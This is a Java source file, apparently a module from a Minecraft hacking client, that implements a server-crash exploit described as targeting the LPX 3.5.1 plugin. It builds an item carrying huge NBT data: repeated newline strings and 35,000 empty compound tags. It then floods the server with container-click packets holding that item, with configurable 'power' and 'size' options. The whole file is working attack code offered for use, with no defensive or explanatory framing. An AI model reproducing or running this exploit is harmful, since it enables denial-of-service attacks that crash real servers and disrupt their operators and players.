package us.whitedev.exploits.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import java.util.List;
import java.util.Optional;
import java.util.stream.IntStream;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.exploits.Exploit;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class LPXExploit implements Exploit {
   private static final String EXPLOIT_NAME = "LPXExploit";

   public void onExploit(String[] args) {
      int power = Integer.parseInt(args[2]);
      int size = Integer.parseInt(args[3]);
      msgHelper.sendMessage(String.format("Sending Exploit... &8[&f%s&8]", this.getName()), true);
      ItemStack stack1 = this.getLPXStack(size);

      for(int i = 0; i < power; ++i) {
         PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, stack1, new Int2ObjectOpenHashMap()));
      }

      msgHelper.sendMessage("Exploit &asuccessfully &7sent!", true);
   }

   private ItemStack getLPXStack(int size) {
      CompoundTag compoundTag = new CompoundTag();

      for(int i = 0; i < 5; ++i) {
         compoundTag.putString(String.valueOf(i), "X\nY\nN\nI\nS\n".repeat(size));
      }

      CompoundTag properties = new CompoundTag();
      ListTag propertyList = new ListTag();
      IntStream.range(0, 35000).forEach((ix) -> {
         propertyList.add(new CompoundTag());
      });
      properties.put("", propertyList);
      compoundTag.put("XYNIS", properties);
      return new ItemStack(Items.OAK_BOAT, 1, Optional.of(compoundTag));
   }

   public String getName() {
      return "LPXExploit";
   }

   public List<OptionUtil> getOptions() {
      return List.of(new OptionUtil("Power", OptionType.INTEGER), new OptionUtil("Size", OptionType.INTEGER));
   }

   public String getArgsUsage() {
      return "power[30], Size[1000]";
   }

   public String getDescription() {
      return "LPX 3.5.1 Debugger Crash Exploit";
   }
}
